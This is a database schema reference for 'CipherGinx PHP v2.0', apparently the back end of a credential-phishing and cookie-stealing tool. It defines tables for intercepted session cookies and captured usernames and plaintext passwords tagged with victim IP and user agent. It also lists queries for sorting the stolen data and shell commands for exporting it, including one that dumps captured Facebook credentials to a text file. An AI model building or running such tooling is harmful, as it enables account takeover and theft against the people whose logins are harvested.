# CipherGinx PHP v2.0

## 📊 Database Schema Reference

### Table: `captured_cookies`
Stores all intercepted HTTP cookies with metadata.

```sql
CREATE TABLE `captured_cookies` (
  `id` INT UNSIGNED NOT NULL AUTO_INCREMENT PRIMARY KEY,
  `name` VARCHAR(255) NOT NULL COMMENT 'Cookie name',
  `value` LONGTEXT NOT NULL COMMENT 'Cookie value',
  `domain` VARCHAR(255) COMMENT 'Cookie domain',
  `path` VARCHAR(255) DEFAULT '/' COMMENT 'Cookie path',
  `expires` VARCHAR(255) COMMENT 'Expiration date',
  `secure` BOOLEAN DEFAULT FALSE COMMENT 'Secure flag',
  `httponly` BOOLEAN DEFAULT FALSE COMMENT 'HttpOnly flag',
  `samesite` VARCHAR(10) DEFAULT 'Lax' COMMENT 'SameSite attribute',
  `captured_at` TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
  `source_ip` VARCHAR(45) COMMENT 'Client IP',
  `user_agent` TEXT COMMENT 'User agent string',
  INDEX `idx_domain` (`domain`),
  INDEX `idx_captured_at` (`captured_at`),
  INDEX `idx_name` (`name`)
);
```

### Table: `captured_credentials`
Form submissions and login attempts.

```sql
CREATE TABLE `captured_credentials` (
  `id` INT UNSIGNED NOT NULL AUTO_INCREMENT PRIMARY KEY,
  `username` VARCHAR(255) COMMENT 'Username/email',
  `password` TEXT COMMENT 'Password (encrypted recommended)',
  `form_data` LONGTEXT COMMENT 'Full form submission (JSON)',
  `target_domain` VARCHAR(255) NOT NULL,
  `source_ip` VARCHAR(45) COMMENT 'Client IP',
  `user_agent` TEXT COMMENT 'User agent',
  `referer` VARCHAR(2083) COMMENT 'HTTP Referer',
  `captured_at` TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
  `status` ENUM('pending', 'verified', 'failed') DEFAULT 'pending',
  INDEX `idx_target_domain` (`target_domain`),
  INDEX `idx_captured_at` (`captured_at`)
);
```

### Useful Queries

```sql
-- All captured credentials
SELECT username, password, target_domain, captured_at 
FROM captured_credentials 
ORDER BY captured_at DESC LIMIT 20;

-- Session cookies only
SELECT name, value, domain 
FROM captured_cookies 
WHERE httponly = 1 
ORDER BY captured_at DESC;

-- Capture summary by domain
SELECT target_domain, COUNT(*) as count 
FROM captured_credentials 
GROUP BY target_domain 
ORDER BY count DESC;

-- Recent activity (last hour)
SELECT * FROM captured_cookies 
WHERE captured_at > DATE_SUB(NOW(), INTERVAL 1 HOUR) 
ORDER BY captured_at DESC;
```

---

## 🔒 Export Captured Data

```bash
# Export to CSV
mysql -u root -p cipherginx -e \
  "SELECT * FROM captured_credentials" | \
  sed 's/\t/,/g' > export.csv

# Backup entire database
mysqldump -u root -p cipherginx > backup.sql

# Export specific credentials
mysql -u root -p -e "
  SELECT username, password, captured_at 
  FROM cipherginx.captured_credentials 
  WHERE target_domain = 'facebook.com'
" > facebook_creds.txt
```

